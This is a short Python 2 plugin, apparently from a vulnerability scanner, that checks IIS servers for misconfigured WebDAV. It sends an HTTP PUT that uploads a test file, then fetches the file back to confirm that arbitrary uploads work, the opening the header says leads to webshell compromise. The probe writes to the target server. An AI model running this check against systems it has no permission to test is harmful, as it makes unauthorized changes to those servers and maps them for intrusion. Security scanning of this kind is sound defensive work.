#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Name:IIS WebDav
# Descript:开启了WebDav且配置不当可导致攻击者直接上传webshell，进而导致服务器被入侵控制。
# author: wolf@YSRC
import socket
import time
import urllib2

def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nw8scan\r\n\r\n" % (ip, port)
        s.send(flag)
        time.sleep(1)
        data = s.recv(1024)
        s.close()
        if 'PUT' in data:
            url = 'http://' + ip + ":" + str(port) + '/vultest.txt'
            request = urllib2.Request(url)
            res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
            if 'w8scan' in res_html:
                report.add_list("漏洞信息","存在iis webdav漏洞！ eg:" + url)
                report.send()
                return u"iis webdav漏洞"
    except Exception, e:
        pass

check(_IP,80,20)